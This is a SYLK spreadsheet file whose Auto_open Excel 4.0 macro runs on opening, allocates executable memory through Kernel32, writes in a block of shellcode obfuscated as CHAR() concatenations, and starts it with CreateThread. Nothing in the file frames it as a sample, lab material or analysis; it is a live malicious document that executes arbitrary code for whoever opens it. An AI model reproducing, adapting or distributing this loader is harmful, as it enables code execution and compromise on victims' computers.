ID;P
O;E
NN;NAuto_open;ER1C1
C;X1;Y1;ER1C2()
C;X1;Y2;ECALL("Kernel32","VirtualAlloc","JJJJJ",0,1000000,4096,64)
C;X1;Y3;ESELECT(R1C2:R1000:C2,R1C2)
C;X1;Y4;ESET.VALUE(R1C3, 0)
C;X1;Y5;EWHILE(LEN(ACTIVE.CELL())>0)
C;X1;Y6;ECALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, R2C1 + R1C3 * 20,ACTIVE.CELL(), LEN(ACTIVE.CELL()), 0)
C;X1;Y7;ESET.VALUE(R1C3, R1C3 + 1)
C;X1;Y8;ESELECT(, "R[1]C")
C;X1;Y9;ENEXT()
C;X1;Y10;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C1, 0, 0, 0)
C;X1;Y11;EHALT()
C;X2;Y1;ECHAR(218)&CHAR(215)&CHAR(217)&CHAR(116)&CHAR(36)&CHAR(244)&CHAR(187)&CHAR(162)&CHAR(54)&CHAR(245)&CHAR(63)&CHAR(88)&CHAR(41)&CHAR(201)&CHAR(177)&CHAR(125)&CHAR(49)&CHAR(88)&CHAR(26)&CHAR(131)
C;X2;Y2;ECHAR(232)&CHAR(252)&CHAR(3)&CHAR(88)&CHAR(22)&CHAR(226)&CHAR(87)&CHAR(237)&CHAR(61)&CHAR(132)&CHAR(248)&CHAR(46)&CHAR(7)&CHAR(137)&CHAR(223)&CHAR(59)&CHAR(83)&CHAR(154)&CHAR(128)&CHAR(234)
C;X2;Y3;ECHAR(82)&CHAR(211)&CHAR(73)&CHAR(220)&CHAR(59)&CHAR(3)&CHAR(182)&CHAR(65)&CHAR(211)&CHAR(168)&CHAR(16)&CHAR(69)&CHAR(128)&CHAR(41)&CHAR(141)&CHAR(57)&CHAR(116)&CHAR(42)&CHAR(120)&CHAR(162)
C;X2;Y4;ECHAR(84)&CHAR(188)&CHAR(126)&CHAR(148)&CHAR(51)&CHAR(186)&CHAR(42)&CHAR(208)&CHAR(162)&CHAR(176)&CHAR(249)&CHAR(164)&CHAR(11)&CHAR(156)&CHAR(134)&CHAR(187)&CHAR(111)&CHAR(237)&CHAR(77)&CHAR(175)
C;X2;Y5;ECHAR(50)&CHAR(63)&CHAR(128)&CHAR(68)&CHAR(106)&CHAR(126)&CHAR(84)&CHAR(121)&CHAR(106)&CHAR(173)&CHAR(79)&CHAR(33)&CHAR(207)&CHAR(192)&CHAR(118)&CHAR(200)&CHAR(76)&CHAR(251)&CHAR(30)&CHAR(7)
C;X2;Y6;ECHAR(58)&CHAR(134)&CHAR(129)&CHAR(88)&CHAR(42)&CHAR(182)&CHAR(109)&CHAR(7)&CHAR(245)&CHAR(79)&CHAR(63)&CHAR(28)&CHAR(116)&CHAR(207)&CHAR(133)&CHAR(2)&CHAR(82)&CHAR(187)&CHAR(39)&CHAR(241)
C;X2;Y7;ECHAR(234)&CHAR(121)&CHAR(164)&CHAR(134)&CHAR(177)&CHAR(174)&CHAR(63)&CHAR(239)&CHAR(23)&CHAR(176)&CHAR(22)&CHAR(36)&CHAR(24)&CHAR(106)&CHAR(140)&CHAR(62)&CHAR(176)&CHAR(219)&CHAR(245)&CHAR(143)
C;X2;Y8;ECHAR(162)&CHAR(78)&CHAR(17)&CHAR(9)&CHAR(103)&CHAR(120)&CHAR(228)&CHAR(206)&CHAR(178)&CHAR(101)&CHAR(249)&CHAR(175)&CHAR(137)&CHAR(66)&CHAR(98)&CHAR(118)&CHAR(167)&CHAR(9)&CHAR(188)&CHAR(203)
C;X2;Y9;ECHAR(218)&CHAR(204)&CHAR(185)&CHAR(59)&CHAR(175)&CHAR(169)&CHAR(94)&CHAR(207)&CHAR(165)&CHAR(82)&CHAR(21)&CHAR(64)&CHAR(169)&CHAR(17)&CHAR(156)&CHAR(35)&CHAR(221)&CHAR(109)&CHAR(99)&CHAR(247)
C;X2;Y10;ECHAR(49)&CHAR(3)&CHAR(246)&CHAR(251)&CHAR(133)&CHAR(205)&CHAR(193)&CHAR(41)&CHAR(183)&CHAR(22)&CHAR(144)&CHAR(181)&CHAR(59)&CHAR(1)&CHAR(214)&CHAR(183)&CHAR(164)&CHAR(44)&CHAR(81)&CHAR(155)
C;X2;Y11;ECHAR(147)&CHAR(94)&CHAR(181)&CHAR(208)&CHAR(217)&CHAR(217)&CHAR(97)&CHAR(174)&CHAR(181)&CHAR(253)&CHAR(246)&CHAR(233)&CHAR(192)&CHAR(130)&CHAR(219)&CHAR(50)&CHAR(249)&CHAR(127)&CHAR(192)&CHAR(217)
C;X2;Y12;ECHAR(132)&CHAR(79)&CHAR(49)&CHAR(225)&CHAR(83)&CHAR(250)&CHAR(160)&CHAR(105)&CHAR(218)&CHAR(155)&CHAR(188)&CHAR(50)&CHAR(4)&CHAR(188)&CHAR(69)&CHAR(125)&CHAR(233)&CHAR(163)&CHAR(200)&CHAR(106)
C;X2;Y13;ECHAR(207)&CHAR(178)&CHAR(86)&CHAR(192)&CHAR(95)&CHAR(251)&CHAR(57)&CHAR(60)&CHAR(154)&CHAR(102)&CHAR(23)&CHAR(109)&CHAR(130)&CHAR(33)&CHAR(138)&CHAR(255)&CHAR(231)&CHAR(191)&CHAR(161)&CHAR(1)
C;X2;Y14;ECHAR(228)&CHAR(211)&CHAR(173)&CHAR(159)&CHAR(125)&CHAR(35)&CHAR(3)&CHAR(122)&CHAR(209)&CHAR(182)&CHAR(173)&CHAR(113)&CHAR(12)&CHAR(129)&CHAR(209)&CHAR(238)&CHAR(73)&CHAR(160)&CHAR(198)&CHAR(5)
C;X2;Y15;ECHAR(181)&CHAR(142)&CHAR(102)&CHAR(218)&CHAR(133)&CHAR(127)&CHAR(2)&CHAR(128)&CHAR(246)&CHAR(174)&CHAR(225)&CHAR(208)&CHAR(52)&CHAR(240)&CHAR(153)&CHAR(174)&CHAR(143)&CHAR(163)&CHAR(201)&CHAR(139)
C;X2;Y16;ECHAR(165)&CHAR(228)&CHAR(144)&CHAR(114)&CHAR(209)&CHAR(184)&CHAR(251)&CHAR(17)&CHAR(250)&CHAR(84)&CHAR(245)&CHAR(4)&CHAR(136)&CHAR(42)&CHAR(115)&CHAR(141)&CHAR(2)&CHAR(53)&CHAR(40)&CHAR(3)
C;X2;Y17;ECHAR(183)&CHAR(221)&CHAR(97)&CHAR(179)&CHAR(228)&CHAR(114)&CHAR(212)&CHAR(158)&CHAR(71)&CHAR(51)&CHAR(3)&CHAR(131)&CHAR(39)&CHAR(143)&CHAR(82)&CHAR(163)&CHAR(144)&CHAR(171)&CHAR(41)&CHAR(212)
C;X2;Y18;ECHAR(16)&CHAR(44)&CHAR(82)&CHAR(105)&CHAR(196)&CHAR(31)&CHAR(24)&CHAR(120)&CHAR(57)&CHAR(253)&CHAR(50)&CHAR(56)&CHAR(155)&CHAR(172)&CHAR(78)&CHAR(110)&CHAR(181)&CHAR(249)&CHAR(201)&CHAR(18)
C;X2;Y19;ECHAR(46)&CHAR(74)&CHAR(62)&CHAR(37)&CHAR(217)&CHAR(179)&CHAR(231)&CHAR(222)&CHAR(4)&CHAR(127)&CHAR(189)&CHAR(225)&CHAR(153)&CHAR(228)&CHAR(68)&CHAR(35)&CHAR(124)&CHAR(34)&CHAR(66)&CHAR(236)
C;X2;Y20;ECHAR(109)&CHAR(60)&CHAR(186)&CHAR(129)&CHAR(11)&CHAR(57)&CHAR(53)&CHAR(226)&CHAR(165)&CHAR(137)&CHAR(14)&CHAR(5)&CHAR(175)&CHAR(128)&CHAR(237)&CHAR(151)&CHAR(58)&CHAR(59)&CHAR(43)&CHAR(38)
C;X2;Y21;ECHAR(227)&CHAR(96)&CHAR(144)&CHAR(200)&CHAR(166)&CHAR(41)&CHAR(52)&CHAR(253)&CHAR(88)&CHAR(196)&CHAR(226)&CHAR(58)&CHAR(128)&CHAR(31)&CHAR(69)&CHAR(18)&CHAR(80)&CHAR(129)&CHAR(207)&CHAR(61)
C;X2;Y22;ECHAR(191)&CHAR(29)&CHAR(250)&CHAR(99)&CHAR(46)&CHAR(1)&CHAR(205)&CHAR(3)&CHAR(111)&CHAR(74)&CHAR(129)&CHAR(141)&CHAR(15)&CHAR(198)&CHAR(213)&CHAR(18)&CHAR(179)&CHAR(111)&CHAR(117)&CHAR(6)
C;X2;Y23;ECHAR(38)&CHAR(142)&CHAR(189)&CHAR(146)&CHAR(61)&CHAR(176)&CHAR(15)&CHAR(154)&CHAR(224)&CHAR(74)&CHAR(49)&CHAR(212)&CHAR(46)&CHAR(30)&CHAR(37)&CHAR(97)&CHAR(42)&CHAR(151)&CHAR(225)&CHAR(65)
C;X2;Y24;ECHAR(161)&CHAR(102)&CHAR(180)&CHAR(29)&CHAR(208)&CHAR(28)&CHAR(195)&CHAR(75)&CHAR(39)&CHAR(89)&CHAR(24)&CHAR(31)&CHAR(203)&CHAR(193)&CHAR(179)&CHAR(100)&CHAR(187)&CHAR(35)&CHAR(16)&CHAR(89)
C;X2;Y25;ECHAR(18)&CHAR(200)&CHAR(197)&CHAR(146)&CHAR(176)&CHAR(152)&CHAR(235)&CHAR(27)&CHAR(33)&CHAR(14)&CHAR(173)&CHAR(164)&CHAR(201)&CHAR(34)&CHAR(7)&CHAR(230)&CHAR(130)&CHAR(141)&CHAR(25)&CHAR(214)
C;X2;Y26;ECHAR(34)&CHAR(149)&CHAR(187)&CHAR(73)&CHAR(178)&CHAR(196)&CHAR(248)&CHAR(224)&CHAR(145)&CHAR(178)&CHAR(76)&CHAR(146)&CHAR(221)&CHAR(63)&CHAR(105)&CHAR(157)&CHAR(221)&CHAR(35)&CHAR(60)&CHAR(220)
C;X2;Y27;ECHAR(240)&CHAR(97)&CHAR(254)&CHAR(229)&CHAR(236)&CHAR(190)
C;X2;Y28;K0;ERETURN()
E